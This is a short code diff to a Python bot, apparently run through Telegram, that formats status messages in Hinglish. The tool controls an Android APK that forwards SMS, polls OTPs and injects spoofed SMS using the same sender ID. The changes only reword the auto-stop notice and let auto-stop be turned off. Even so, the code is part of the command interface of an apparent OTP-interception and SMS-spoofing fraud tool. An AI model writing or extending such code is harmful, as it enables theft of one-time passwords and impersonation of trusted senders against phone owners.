@@ -551,8 +551,14 @@ def format_auto_stop_card(minutes: int = 15) -> str:
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "Monitoring STOPPED!\n"
-        "✅ No more SMS forward/inject."
+        f"Monitoring STOPPED! ({minutes} min auto-stop)\n"
+        "⏸️ Inject + OTP poll + APK uptime band ho gaye.\n\n"
+        "Dobara start:\n"
+        "1. /startmonitor ya /resume\n"
+        "2. APK: START SERVICE ON + same KEY\n"
+        "3. /injecttest — phone pe SMS check\n\n"
+        "Timer badhana: /autostop 60 (minutes)\n"
+        "Band karna: /autostop 0 (manual stop tak chalega)"
         "</pre>"
     )
 
@@ -579,7 +585,12 @@ def format_monitoring_card(
         sim_suffix = display_phone(str(sim_number))
     else:
         sim_suffix = "Unknown"
-    auto_stop = profile.auto_stop_minutes or 15
+    auto_stop = profile.auto_stop_minutes if profile.auto_stop_minutes is not None else 15
+    auto_stop_line = (
+        "⏱️ Auto-stop: OFF (manual /stop tak)"
+        if auto_stop <= 0
+        else f"⏱️ Auto-stop in {auto_stop} minutes"
+    )
     inject_key = get_inject_key(profile, device)
     test_msg = test_message or STARTUP_TEST_MESSAGE
     test_line = f"✅ Test inject OK: {test_msg}" if startup_test_sent else "⏳ Test inject queued..."
@@ -597,7 +608,7 @@ def format_monitoring_card(
         "📩 Incoming -&gt; spoof inject (same sender ID)\n"
         f"📞 Real SMS -&gt; {real_sms}\n"
         f"📢 Channel: {channel} (last /addchannel only)\n"
-        f"⏱️ Auto-stop in {auto_stop} minutes\n"
+        f"{auto_stop_line}\n"
         f"🗃️ Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
         f"{test_line}"
         "</pre>"
